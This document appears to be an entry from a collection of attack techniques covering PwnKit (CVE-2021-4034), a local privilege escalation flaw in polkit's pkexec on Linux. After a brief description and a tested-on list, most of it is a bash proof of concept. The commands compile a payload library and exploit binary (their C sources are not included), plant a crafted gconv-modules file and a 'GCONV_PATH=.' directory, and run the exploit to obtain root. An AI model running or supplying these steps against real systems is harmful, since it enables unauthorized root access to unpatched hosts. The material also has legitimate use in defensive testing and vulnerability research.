# PwnKit Vulnerability - Local Privilege Escalation

- Title:         PwnKit Vulnerability - Local Privilege Escalation
- Target:        Linux
- Category:      Execution
- Credits:       Qualys Research Team   

## Description

The Qualys Research Team has discovered a memory corruption vulnerability in polkit’s pkexec, a SUID-root program that is installed by default on every major Linux distribution. This easily exploited vulnerability allows any unprivileged user to gain full root privileges on a vulnerable host by exploiting this vulnerability in its default configuration.

[PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034)](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)

## Tested on

>
> Ubuntu 20.04.3 LTS x86_64
>
> pkexec version 0.105
>

## PoC

```bash
mkdir /tmp/pwnkit_lpe/
gcc -shared -o /tmp/pwnkit_lpe/pwnkit.so -fPIC ./library.c
gcc ./exploit.c -o /tmp/pwnkit_lpe/pwnkit
echo "module UTF-8// PWNKIT// pwnkit 1" > /tmp/pwnkit_lpe/gconv-modules
mkdir -p "/tmp/pwnkit_lpe/GCONV_PATH=."
cp /usr/bin/true "/tmp/pwnkit_lpe/GCONV_PATH=./pwnkit.so:."
cd /tmp/pwnkit_lpe/
./pwnkit
```
